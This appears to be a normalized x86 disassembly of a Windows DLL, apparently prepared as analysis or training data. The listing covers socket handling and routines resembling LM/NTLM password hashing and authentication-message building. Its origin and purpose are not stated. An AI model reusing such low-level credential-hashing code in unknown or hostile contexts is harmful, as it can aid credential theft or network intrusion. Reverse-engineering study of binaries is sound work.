call sub_10007c8b
mov esi eax
mov eax [ esp + 0x28 ]
mov [ esi ] edi
mov [ esi + 0x4 ] 0x2
mov eax [ eax + 0xc ]
pop ecx
push [ esp + 0x1c ]
mov [ esi + 0xc ] eax
mov eax [ esp + 0x48 ]
mov [ esi + 0x10 ] eax
call [ EnterCriticalSection@IAT ]
push esi
mov esi [ esp + 0x24 ]
jmp r-xdata
add ebx 0x8
dec [ esp + 0x10 ]
jne r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
mov esi [ esp + 0x10 ]
push [ esi + 0x20cc ]
call [ closesocket@IAT ]
push 0xc
push 0x0
add esi 0x20c8
push esi
push [ esp + 0x18 ]
mov [ esi ] 0x1c
mov [ esi + 0x4 ] 0x2
mov [ esi + 0x8 ] 0x1
mov eax [ ebx + 0xc ]
mov [ esi + 0xc ] eax
call [ EnterCriticalSection@IAT ]
push esi
lea esi [ edi + 0x20a0 ]
call sub_1000a093
push [ esp + 0x18 ]
call [ LeaveCriticalSection@IAT ]
push 0x1c
call sub_10007c8b
mov esi eax
pop ecx
test esi esi
je r-xdata
push 0x0
push [ ebx + 0x10 ]
lea ecx [ ebx + 0x14 ]
push ecx
push eax
call [ send@IAT ]
cmp eax [ ebx + 0x10 ]
je r-xdata
cmp [ eax ] ecx
je r-xdata
jmp r-xdata
push 0xc
push 0x0
add ebx 0x20c8
push ebx
jmp r-xdata
push eax
call [ closesocket@IAT ]
cmp [ ecx ] ebx
je r-xdata
jmp r-xdata
push 0x1c
call sub_10007c8b
mov esi eax
pop ecx
test esi esi
je r-xdata
xor eax eax
inc eax
mov [ esp + 0x10 ] eax
mov [ edi + 0x2074 ] eax
mov eax [ edi + 0x50c8 ]
and [ edi + 0x2074 ] edx
call sub_1000904f
lea ebx [ edi + 0x20cc ]
push [ ebx + 0x4 ]
call [ closesocket@IAT ]
push 0xc
push 0x0
push [ esp + 0x18 ]
mov [ esi ] 0x1c
mov [ esi + 0x4 ] 0x2
mov [ esi + 0x8 ] 0x1
mov eax [ ebx ]
mov [ esi + 0xc ] eax
call [ EnterCriticalSection@IAT ]
push esi
lea esi [ edi + 0x20a0 ]
call sub_1000a093
push [ esp + 0x18 ]
call [ LeaveCriticalSection@IAT ]
add eax 0x14
cmp eax 0x1c
jae r-xdata
cmp eax 0x8
jb r-xdata
push [ esp + 0x1c ]
call [ EnterCriticalSection@IAT ]
push ebx
cmp [ ecx ] 0x0
je r-xdata
jmp r-xdata
add esi 0x2034
call sub_1000a093
push [ esp + 0x1c ]
call [ LeaveCriticalSection@IAT ]
mov esi [ esp + 0x24 ]
cmp [ ebx - 0x4 ] 0x0
je r-xdata
push 0x2000
lea eax [ edi + 0xc ]
push 0x0
push eax
call [ memset@IAT ]
add esp 0xc
jmp r-xdata
push eax
call [ closesocket@IAT ]
mov esi [ esp + 0x10 ]
push [ esi + 0x20cc ]
call [ closesocket@IAT ]
push 0xc
push 0x0
add esi 0x20c8
push esi
call [ memset@IAT ]
add esp 0xc
push [ esp + 0x18 ]
mov [ esi ] 0x1c
mov [ esi + 0x4 ] 0x2
mov [ esi + 0x8 ] 0x1
mov eax [ ebx + 0xc ]
mov [ esi + 0xc ] eax
call [ EnterCriticalSection@IAT ]
push esi
lea esi [ edi + 0x20a0 ]
call sub_1000a093
push [ esp + 0x18 ]
call [ LeaveCriticalSection@IAT ]
cmp [ esp + 0x14 ] 0x400
jb r-xdata
call [ memset@IAT ]
add esp 0xc
xor eax eax
mov [ esi ] 0x1c
mov [ esi + 0x4 ] 0x3
mov [ esi + 0x8 ] 0x1
cmp [ esp + 0x10 ] eax
jne r-xdata
add ebx 0xc
dec esi
jne r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
push eax
call sub_10007c8b
mov esi eax
pop ecx
test esi esi
je r-xdata
push 0x1c
pop eax
push [ ebx + 0x4 ]
call [ closesocket@IAT ]
push 0xc
push esi
jmp r-xdata
cmp [ esp + 0x158 ] 0x4
jne r-xdata
push 0x1c
call sub_10007c8b
mov esi eax
pop ecx
test esi esi
je r-xdata
mov [ esi + 0x10 ] eax
mov eax [ edi + 0x50c8 ]
mov eax [ eax + 0x4 ]
cmp [ ebx - 0x4 ] 0x0
je r-xdata
push 0x3000
push esi
lea eax [ edi + 0x20c8 ]
push eax
jmp r-xdata
push eax
call [ closesocket@IAT ]
mov eax [ esp + 0x14 ]
add eax 0x14
cmp eax 0x1c
jae r-xdata
push ebx
call [ memset@IAT ]
add esp 0xc
cmp [ esp + 0x159 ] 0x1
jne r-xdata
mov [ esi ] 0x1c
mov [ esi + 0x4 ] 0x2
mov [ esi + 0x8 ] 0x1
mov eax [ ebx + 0xc ]
mov [ esi + 0xc ] eax
jmp r-xdata
push [ esp + 0x14 ]
mov [ esi ] eax
xor eax eax
inc eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
mov eax [ ebx ]
mov [ esi + 0xc ] eax
lea eax [ esp + 0x15c ]
push eax
lea eax [ esi + 0x14 ]
push eax
call [ memcpy@IAT ]
mov eax [ esp + 0x20 ]
add esp 0xc
mov [ esi + 0x10 ] eax
push 0x1c
pop eax
add eax 0x14
mov [ esp + 0x14 ] eax
cmp eax 0x1c
jae r-xdata
push [ esp + 0x18 ]
call [ EnterCriticalSection@IAT ]
push esi
lea esi [ edi + 0x20a0 ]
call sub_1000a093
push [ esp + 0x18 ]
call [ LeaveCriticalSection@IAT ]
jmp r-xdata
push eax
call sub_10007c8b
mov esi eax
pop ecx
test esi esi
je r-xdata
push 0x1c
pop eax
mov eax [ esp + 0x14 ]
cmp eax 0x1c
jae r-xdata
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
mov [ esi + 0x8 ] 0x1
mov eax [ ebx ]
mov [ esi + 0xc ] eax
mov eax [ esp + 0x15c ]
mov [ esi + 0x10 ] eax
push [ esp + 0x15a ]
call [ ntohs@IAT ]
movzx eax ax
mov [ esi + 0x14 ] eax
jmp r-xdata
push 0x1c
pop eax
push [ esp + 0x18 ]
call [ EnterCriticalSection@IAT ]
push esi
lea esi [ edi + 0x20a0 ]
call sub_1000a093
push [ esp + 0x18 ]
call [ LeaveCriticalSection@IAT ]
jmp r-xdata
sub_1000a06f
push esi
mov esi ecx
lea eax [ esi + 0x4 ]
push eax
mov [ esi ] r--data
call [ DeleteCriticalSection@IAT ]
mov esi [ esi + 0x1c ]
test esi esi
je r-xdata
pop esi
retn
push esi
call [ free@IAT ]
pop ecx
sub_1000a093
push ebp
mov ebp esp
push ecx
push ebx
push edi
mov edi [ esi + 0x24 ]
mov [ ebp - 0x1 ] 0x0
cmp edi [ esi + 0x20 ]
ja r-xdata
mov ecx [ esi + 0x20 ]
mov eax [ esi + 0x1c ]
shl ecx 0x2
push ecx
push eax
add eax 0x4
push eax
call [ memmove@IAT ]
mov eax [ esi + 0x1c ]
mov ecx [ ebp + 0x8 ]
add esp 0xc
mov [ eax ] ecx
inc [ esi + 0x20 ]
mov [ ebp - 0x1 ] 0x1
mov ebx [ esi + 0x1c ]
lea eax [ edi * 4 + 0x28 ]
push eax
call [ malloc@IAT ]
pop ecx
mov [ esi + 0x1c ] eax
test eax eax
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop ebx
leave
retn 0x4
test ebx ebx
je r-xdata
add [ esi + 0x24 ] 0xa
mov ecx edi
shl ecx 0x2
push ecx
push ebx
push eax
call [ memcpy@IAT ]
add esp 0xc
sub_1000a107
push ebp
mov ebp esp
push esi
mov esi eax
mov ecx [ esi + 0x20 ]
xor al al
test ecx ecx
je r-xdata
pop esi
pop ebp
retn 0x4
mov eax [ esi + 0x1c ]
mov eax [ eax + ecx * 4 - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
dec [ esi + 0x20 ]
call sub_1000a151
mov al 0x1
sub_1000a131
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1000a06f
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
pop ecx
sub_1000a151
mov eax [ esi + 0x24 ]
push edi
mov edi [ esi + 0x20 ]
sub eax edi
cmp eax 0x14
jb r-xdata
mov al 0x1
pop edi
retn
push ebx
mov ebx [ esi + 0x1c ]
lea eax [ edi * 4 + 0x28 ]
push eax
call [ malloc@IAT ]
pop ecx
mov [ esi + 0x1c ] eax
test eax eax
je r-xdata
pop ebx
test ebx ebx
je r-xdata
mov eax [ esi + 0x20 ]
add eax 0xa
mov [ esi + 0x24 ] eax
mov ecx edi
shl ecx 0x2
push ecx
push ebx
push eax
call [ memcpy@IAT ]
add esp 0xc
sub_1000a19c
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x18 ]
push ecx
lea ecx [ ebp - 0x14 ]
push ecx
push [ eax + 0x10c ]
mov [ ebp - 0x18 ] 0x10
call [ getpeername@IAT ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x10 ]
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10014571
leave
retn 0x4
sub_1000a1e3
push ebp
mov ebp esp
sub esp 0x110
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ esi + 0x10c ]
imul eax eax 0x3e8
push edi
mov [ ebp - 0x10c ] eax
xor edx edx
lea eax [ ebp - 0x110 ]
push eax
push edx
lea eax [ ebp - 0x108 ]
push eax
mov [ ebp - 0x104 ] ecx
push edx
inc ecx
push ecx
mov [ ebp - 0x108 ] 0x1
mov [ ebp - 0x110 ] edx
call [ select@IAT ]
mov edi eax
call [ GetLastError@IAT ]
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov eax edi
xor ecx ebp
pop edi
call sub_10014571
leave
retn 0x4
sub_1000a258
push esi
push edi
push 0x10114
mov edi ecx
call [ operator new@IAT ]
mov esi eax
pop ecx
test esi esi
je r-xdata
xor esi esi
call sub_10008f4e
mov [ esi ] r--data
jmp r-xdata
lea eax [ edi + 0x8 ]
push eax
lea eax [ esi + 0x8 ]
push eax
call [ strcpy@IAT ]
mov eax [ edi + 0x108 ]
mov [ esi + 0x108 ] eax
mov eax [ edi + 0x10c ]
pop ecx
mov [ esi + 0x10c ] eax
mov eax [ edi + 0x110 ]
pop ecx
mov [ esi + 0x110 ] eax
pop edi
mov eax esi
pop esi
retn
sub_1000a2b6
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10008f6f
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
pop ecx
sub_1000a2dc
push ebx
push edi
push esi
mov [ esi + 0x108 ] eax
call sub_1000a714
mov ebx eax
test ebx ebx
jne r-xdata
mov edi [ esi + 0x108 ]
push edi
push edi
push ebx
push esi
call sub_1000a7ce
test eax eax
jns r-xdata
xor eax eax
jmp r-xdata
push 0xa
push ebx
call [ listen@IAT ]
test eax eax
js r-xdata
call [ GetLastError@IAT ]
push ebx
mov [ esi + 0x4 ] eax
call [ closesocket@IAT ]
jmp r-xdata
pop edi
pop ebx
retn
mov [ esi + 0x110 ] ebx
mov eax ebx
sub_1000a331
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x110 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10014571
leave
retn
push esi
mov esi [ ioctlsocket@IAT ]
push edi
lea ecx [ ebp - 0x1c ]
push ecx
mov edi 0x8004667e
push edi
push eax
mov [ ebp - 0x1c ] 0x1
call esi
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push [ ebx + 0x110 ]
mov [ ebp - 0x2c ] 0x10
call [ accept@IAT ]
and [ ebp - 0x1c ] 0x0
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x1c ]
push eax
push edi
push [ ebx + 0x110 ]
call esi
cmp [ ebp - 0x18 ] 0xffffffff
je r-xdata
xor eax eax
jmp r-xdata
and [ ebp - 0x1c ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push edi
push [ ebp - 0x18 ]
call esi
mov esi [ setsockopt@IAT ]
xor eax eax
push 0x1e
inc eax
mov [ ebp - 0x24 ] ax
pop eax
push 0x4
mov [ ebp - 0x22 ] ax
lea eax [ ebp - 0x24 ]
push eax
push 0x80
mov edi 0xffff
push edi
push [ ebp - 0x18 ]
call esi
push 0x4
lea eax [ ebp - 0x20 ]
push eax
push 0x1006
push edi
push [ ebp - 0x18 ]
mov [ ebp - 0x20 ] 0x7530
call esi
test eax eax
je r-xdata
pop edi
pop esi
push 0x4
lea eax [ ebp - 0x20 ]
push eax
push 0x1005
push edi
mov edi [ ebp - 0x18 ]
push edi
call esi
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
push [ ebp - 0x18 ]
jmp r-xdata
call [ GetLastError@IAT ]
push edi
push 0x4
lea ecx [ ebp - 0x28 ]
push ecx
inc eax
push eax
push 0x6
push edi
mov [ ebp - 0x28 ] eax
call esi
test eax eax
je r-xdata
mov [ ebx + 0x4 ] eax
call [ closesocket@IAT ]
mov [ ebx + 0x10c ] edi
mov eax edi
sub_1000a457
push ebp
mov ebp esp
push esi
push 0x100
push [ ebp + 0x8 ]
mov esi eax
lea eax [ edi + 0x8 ]
push eax
call [ strncpy@IAT ]
add esp 0xc
mov [ edi + 0x108 ] esi
push esi
mov esi [ ebp + 0x8 ]
mov [ edi + 0x107 ] 0x0
call sub_10007266
push eax
push edi
call sub_1000a494
pop esi
pop ebp
retn 0x4
sub_1000a494
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x24
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x20 ] eax
cmp [ ebp + 0xc ] 0x0
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov [ esp + 0x10 ] eax
jne r-xdata
mov ebx [ closesocket@IAT ]
xor eax eax
jmp r-xdata
push 0xafc8
push 0x9c40
push esi
push [ esp + 0x1c ]
call sub_1000a7ce
test eax eax
js r-xdata
mov ecx [ esp + 0x2c ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_10014571
mov esp ebp
pop ebp
retn 0xc
push 0x2
pop eax
push [ ebp + 0x10 ]
mov [ esp + 0x20 ] ax
mov eax [ ebp + 0xc ]
mov [ esp + 0x24 ] eax
call [ htons@IAT ]
mov [ esp + 0x1e ] ax
push 0x10
lea eax [ esp + 0x20 ]
push eax
push esi
call [ connect@IAT ]
cmp eax 0xffffffff
jne r-xdata
mov edi [ setsockopt@IAT ]
xor eax eax
push 0x1e
inc eax
mov [ esp + 0x18 ] ax
pop eax
push 0x4
mov [ esp + 0x1a ] ax
lea eax [ esp + 0x18 ]
push eax
push 0x80
push 0xffff
push esi
call edi
test eax eax
je r-xdata
call [ WSAGetLastError@IAT ]
push esi
mov edi eax
call ebx
cmp edi 0x2740
je r-xdata
push 0x4
xor eax eax
lea ecx [ esp + 0x1c ]
push ecx
inc eax
push eax
push 0x6
push esi
mov [ esp + 0x2c ] eax
call edi
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
mov ecx [ esp + 0x10 ]
push esi
mov [ ecx + 0x4 ] eax
call ebx
jmp r-xdata
push [ esp + 0x10 ]
call sub_1000a714
mov esi eax
test esi esi
je r-xdata
mov eax [ esp + 0x10 ]
mov [ eax + 0x4 ] edi
jmp r-xdata
mov eax [ esp + 0x10 ]
mov [ eax + 0x10c ] esi
mov eax esi
sub_1000a5b3
push ebp
mov ebp esp
push ecx
push edi
mov edi eax
mov [ ebp - 0x4 ] 0x0
test edi edi
je r-xdata
xor eax eax
inc eax
push 0x0
push 0x1
lea eax [ ebp - 0x4 ]
push eax
push [ esi + 0x10c ]
call [ send@IAT ]
cmp eax 0xffffffff
je r-xdata
call [ WSAGetLastError@IAT ]
call [ GetLastError@IAT ]
mov [ esi + 0x4 ] eax
or eax 0xffffffff
jmp r-xdata
sub edi eax
jne r-xdata
pop edi
leave
retn
sub_1000a5f9
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ ebp + 0xc ] esi
jbe r-xdata
xor eax eax
inc eax
mov eax [ ebp + 0xc ]
sub eax esi
cmp eax 0x400
jb r-xdata
push 0x0
push eax
mov eax [ ebp + 0x8 ]
add eax esi
push eax
push [ edi + 0x10c ]
call [ send@IAT ]
cmp eax 0xffffffff
je r-xdata
mov eax 0x400
call [ WSAGetLastError@IAT ]
test eax eax
je r-xdata
pop esi
pop ebp
retn 0x8
call [ GetLastError@IAT ]
mov [ edi + 0x4 ] eax
or eax 0xffffffff
jmp r-xdata
add esi eax
cmp esi [ ebp + 0xc ]
jb r-xdata
sub_1000a656
push ebx
push edi
mov edi eax
mov ebx ecx
test edi edi
je r-xdata
xor eax eax
inc eax
push 0x0
push edi
push ebx
push [ esi + 0x10c ]
call [ recv@IAT ]
cmp eax 0xffffffff
je r-xdata
call [ GetLastError@IAT ]
mov [ esi + 0x4 ] eax
or eax 0xffffffff
jmp r-xdata
test eax eax
je r-xdata
pop edi
pop ebx
retn
add ebx eax
sub edi eax
jne r-xdata
sub_1000a693
push ebp
mov ebp esp
push ecx
push esi
push edi
mov edi eax
push edi
xor esi esi
push esi
push ebx
call [ memset@IAT ]
lea eax [ edi - 0x1 ]
add esp 0xc
mov [ ebp - 0x4 ] eax
cmp eax esi
jle r-xdata
lea eax [ esi + 0x1 ]
mov eax [ ebp + 0x8 ]
push 0x0
push 0x1
lea edi [ esi + ebx ]
push edi
push [ eax + 0x10c ]
call [ recv@IAT ]
cmp eax 0xffffffff
je r-xdata
call [ WSAGetLastError@IAT ]
cmp eax 0x274c
jne r-xdata
test eax eax
je r-xdata
or esi 0xffffffff
jmp r-xdata
call [ GetLastError@IAT ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x4 ] eax
mov eax esi
jmp r-xdata
test esi esi
je r-xdata
pop edi
pop esi
leave
retn 0x4
inc esi
cmp esi [ ebp - 0x4 ]
jl r-xdata
cmp [ esi + ebx - 0x1 ] 0xd
jne r-xdata
cmp [ edi ] 0xa
je r-xdata
sub_1000a714
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
xor esi esi
push esi
xor edi edi
inc edi
push edi
push 0x2
call [ socket@IAT ]
mov [ ebp - 0x4 ] eax
cmp eax esi
jge r-xdata
push 0x3
push esi
push esi
mov esi [ GetCurrentProcess@IAT ]
lea eax [ ebp - 0x4 ]
push eax
call esi
push eax
push [ ebp - 0x4 ]
call esi
push eax
call [ DuplicateHandle@IAT ]
mov esi [ setsockopt@IAT ]
push 0x4
lea eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x8 ] edi
push 0x4
mov edi 0xffff
push edi
push [ ebp - 0x4 ]
call esi
push 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x1006
push edi
push [ ebp - 0x4 ]
mov [ ebp - 0x8 ] 0x7530
call esi
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x4 ] eax
push 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x1005
push edi
push [ ebp - 0x4 ]
call esi
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
mov ecx [ ebp + 0x8 ]
push [ ebp - 0x4 ]
mov [ ecx + 0x4 ] eax
call [ closesocket@IAT ]
jmp r-xdata
pop edi
pop esi
leave
retn 0x4
mov eax [ ebp - 0x4 ]
xor eax eax
jmp r-xdata
sub_1000a7ce
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x34
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x30 ] eax
mov eax [ ebp + 0x8 ]
or [ esp + 0xc ] 0xffffffff
push ebx
push esi
mov esi [ setsockopt@IAT ]
push edi
push 0x4
mov [ esp + 0x14 ] eax
lea eax [ esp + 0x18 ]
push eax
push 0x4
mov edi 0xffff
push edi
push [ ebp + 0xc ]
xor ebx ebx
mov [ esp + 0x28 ] ebx
call esi
mov eax [ ebp + 0x14 ]
cmp [ ebp + 0x10 ] eax
jne r-xdata
sub eax [ ebp + 0x10 ]
mov [ esp + 0x10 ] eax
fild [ esp + 0x10 ]
fstp [ esp + 0x18 ]
fild [ ebp + 0x10 ]
fstp [ esp + 0x20 ]
push 0x10
lea eax [ esp + 0x30 ]
push ebx
push eax
call [ memset@IAT ]
add esp 0xc
push 0x2
pop eax
push [ ebp + 0x10 ]
mov [ esp + 0x30 ] ax
call [ htons@IAT ]
push ebx
mov [ esp + 0x32 ] ax
call [ htonl@IAT ]
mov [ esp + 0x30 ] eax
push 0x10
lea eax [ esp + 0x30 ]
push eax
push [ ebp + 0xc ]
call [ bind@IAT ]
test eax eax
jns r-xdata
call [ rand@IAT ]
mov [ esp + 0x10 ] eax
fild [ esp + 0x10 ]
fmul [ r--data ]
fmul [ esp + 0x18 ]
fadd [ esp + 0x20 ]
call sub_1001503c
push 0x10
mov [ esp + 0x14 ] eax
lea eax [ esp + 0x30 ]
push ebx
push eax
call [ memset@IAT ]
add esp 0xc
push 0x2
pop eax
push [ esp + 0x10 ]
mov [ esp + 0x30 ] ax
call [ htons@IAT ]
push ebx
mov [ esp + 0x32 ] ax
call [ htonl@IAT ]
mov [ esp + 0x30 ] eax
push 0x10
lea eax [ esp + 0x30 ]
push eax
push [ ebp + 0xc ]
call [ bind@IAT ]
test eax eax
js r-xdata
mov [ esp + 0x18 ] 0x1
call [ GetLastError@IAT ]
mov ecx [ esp + 0x10 ]
mov [ ecx + 0x4 ] eax
jmp r-xdata
push 0x4
lea eax [ esp + 0x18 ]
push eax
push 0x4
push edi
push [ ebp + 0xc ]
mov [ esp + 0x28 ] 0x1
call esi
mov ecx [ esp + 0x3c ]
mov eax [ esp + 0x18 ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_10014571
mov esp ebp
pop ebp
retn 0x10
sub_1000a92e
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov esi [ strlen@IAT ]
push edi
mov edi ecx
push edi
mov [ ebp - 0x18 ] eax
call esi
pop ecx
cmp eax 0xe
push 0xe
lea eax [ ebp - 0x14 ]
jb r-xdata
push 0x0
push eax
call [ memset@IAT ]
push edi
call esi
push eax
lea eax [ ebp - 0x14 ]
push edi
push eax
call [ memcpy@IAT ]
add esp 0x1c
push edi
push eax
call [ memcpy@IAT ]
add esp 0xc
jmp r-xdata
inc edi
cmp edi 0xe
jl r-xdata
movzx eax al
push eax
call [ toupper@IAT ]
pop ecx
mov [ esi ] al
xor edi edi
lea esi [ ebp + edi - 0x14 ]
mov al [ esi ]
test al al
je r-xdata
mov edi [ ebp - 0x18 ]
mov esi rw-data
push esi
mov ecx edi
lea edx [ ebp - 0x14 ]
call sub_100012a2
lea ecx [ edi + 0x8 ]
push esi
lea edx [ ebp - 0xd ]
call sub_100012a2
pop ecx
pop ecx
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10014571
leave
retn
sub_1000a9d2
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x74
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x70 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ memset@IAT ]
push 0x4
xor ebx ebx
mov esi ecx
push ebx
push eax
mov [ esp + 0x80 ] esi
mov [ esp + 0x20 ] eax
call edi
push esi
mov esi [ strlen@IAT ]
call esi
lea eax [ eax + eax + 0x2 ]
push eax
call [ malloc@IAT ]
add esp 0x14
mov [ esp + 0x10 ] eax
cmp eax ebx
je r-xdata
mov ecx [ esp + 0x7c ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_10014571
mov esp ebp
pop ebp
retn
push [ esp + 0x74 ]
call esi
pop ecx
mov eax [ esp + 0x74 ]
movsx cx [ eax + ebx ]
mov edx [ esp + 0x10 ]
mov [ edx + ebx * 2 ] cx
push eax
inc ebx
call esi
pop ecx
cmp ebx eax
jbe r-xdata
push [ esp + 0x10 ]
xor ebx ebx
mov [ esp + 0x30 ] ebx
mov [ esp + 0x2c ] ebx
mov [ esp + 0x1c ] 0x67452301
mov [ esp + 0x20 ] 0xefcdab89
mov [ esp + 0x24 ] 0x98badcfe
mov [ esp + 0x28 ] 0x10325476
call [ wcslen@IAT ]
push [ esp + 0x14 ]
add eax eax
lea esi [ esp + 0x20 ]
call sub_100032d5
pop ecx
pop ecx
push 0x8
pop edx
lea eax [ esp + 0x28 ]
lea ecx [ esp + 0x74 ]
call sub_100032a4
mov ecx [ esp + 0x28 ]
shr ecx 0x3
push 0x38
and ecx 0x3f
pop eax
cmp ecx eax
jb r-xdata
sub eax ecx
push rw-data
lea esi [ esp + 0x1c ]
call sub_100032d5
lea eax [ esp + 0x78 ]
push eax
push 0x8
pop eax
call sub_100032d5
mov ecx [ esp + 0x1c ]
push 0x10
pop edx
mov eax esi
call sub_100032a4
push 0x58
mov eax esi
push ebx
push eax
call edi
push [ esp + 0x24 ]
call [ free@IAT ]
add esp 0x18
push 0x78
pop eax
sub_1000ab06
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ strlen@IAT ]
mov esi r--data
push esi
push esi
xor eax eax
push eax
push eax
push eax
push 0x20
push esi
call edi
pop ecx
shr eax 0x8
push eax
push esi
call edi
pop ecx
mov ebx 0xff
and eax ebx
push eax
push esi
call edi
pop ecx
shr eax 0x8
push eax
push esi
call edi
pop ecx
and eax ebx
push eax
push 0x0
push 0x0
push esi
call edi
add eax 0x20
pop ecx
shr eax 0x8
push eax
push esi
call edi
add eax 0x20
pop ecx
and eax ebx
push eax
push esi
call edi
pop ecx
shr eax 0x8
push eax
push esi
call edi
pop ecx
and eax ebx
push eax
push esi
call edi
pop ecx
shr eax 0x8
push eax
push esi
call edi
pop ecx
and eax ebx
push eax
xor eax eax
push eax
push eax
push 0x2
push 0x2
push eax
push eax
push eax
push 0x1
push eax
push r--data
push 0x400
push [ ebp + 0x8 ]
call [ _snprintf@IAT ]
add esp 0x78
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1000aba3
push ebp
mov ebp esp
sub esp 0x94
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov [ ebp - 0x90 ] eax
mov eax [ ebp + 0xc ]
push esi
mov [ ebp - 0x88 ] eax
lea eax [ ebp - 0x34 ]
push edi
push eax
mov esi ecx
mov ebx edx
call sub_1000a9d2
lea eax [ ebp - 0x1c ]
push eax
mov ecx esi
call sub_1000a92e
mov edi [ memset@IAT ]
push 0x5
xor esi esi
lea eax [ ebp - 0x24 ]
push esi
push eax
call edi
push 0x5
lea eax [ ebp - 0xc ]
push esi
push eax
call edi
push ebx
lea ecx [ ebp - 0x4c ]
lea edx [ ebp - 0x1c ]
call sub_100012a2
push ebx
lea ecx [ ebp - 0x44 ]
lea edx [ ebp - 0x15 ]
call sub_100012a2
push ebx
lea ecx [ ebp - 0x3c ]
lea edx [ ebp - 0xe ]
call sub_100012a2
push ebx
lea ecx [ ebp - 0x64 ]
lea edx [ ebp - 0x34 ]
call sub_100012a2
push ebx
lea ecx [ ebp - 0x5c ]
lea edx [ ebp - 0x2d ]
call sub_100012a2
push ebx
lea ecx [ ebp - 0x54 ]
lea edx [ ebp - 0x26 ]
call sub_100012a2
mov edi [ strlen@IAT ]
mov ebx r--data
push ebx
call edi
push ebx
mov [ ebp - 0x68 ] eax
call edi
add esp 0x40
push [ ebp - 0x88 ]
mov ebx eax
mov [ ebp - 0x78 ] ebx
call edi
mov ecx [ ebp - 0x68 ]
add ecx 0x40
mov [ ebp - 0x6c ] eax
lea edx [ ecx + eax ]
lea edi [ edx + ebx ]
mov [ ebp - 0x74 ] ebx
sar [ ebp - 0x74 ] 0x8
mov [ ebp - 0x70 ] ebx
mov ebx [ ebp - 0x6c ]
lea eax [ edi + 0x18 ]
sar ebx 0x8
mov [ ebp - 0x94 ] eax
mov eax 0xff
and [ ebp - 0x70 ] eax
mov [ ebp - 0x84 ] ebx
mov ebx [ ebp - 0x6c ]
and ebx eax
push esi
push esi
push 0x2
push 0x2
push esi
push esi
push esi
push esi
push esi
push esi
push esi
push esi
mov [ ebp - 0x80 ] ebx
mov ebx [ ebp - 0x68 ]
sar ebx 0x8
mov [ ebp - 0x7c ] ebx
mov ebx [ ebp - 0x68 ]
and ebx eax
mov [ ebp - 0x8c ] ebx
mov ebx edx
and edx eax
sar ebx 0x8
push ebx
push edx
push [ ebp - 0x74 ]
mov edx ecx
push [ ebp - 0x70 ]
sar edx 0x8
push [ ebp - 0x74 ]
and ecx eax
push [ ebp - 0x70 ]
push esi
push esi
push edx
push ecx
push [ ebp - 0x84 ]
mov ecx [ ebp - 0x94 ]
push [ ebp - 0x80 ]
mov edx ecx
push [ ebp - 0x84 ]
sar edx 0x8
push [ ebp - 0x80 ]
and ecx eax
push esi
push esi
push esi
push 0x40
push [ ebp - 0x7c ]
push [ ebp - 0x8c ]
push [ ebp - 0x7c ]
push [ ebp - 0x8c ]
push esi
push esi
push edx
push ecx
push esi
push 0x18
pop ecx
push ecx
push esi
push ecx
push esi
push esi
mov edx edi
sar edx 0x8
push edx
and edi eax
push edi
mov edi [ ebp - 0x90 ]
push esi
push ecx
push esi
push ecx
push esi
push esi
push esi
push 0x3
push esi
push r--data
push 0x400
push edi
call [ _snprintf@IAT ]
mov ebx eax
add esp 0xec
cmp ebx esi
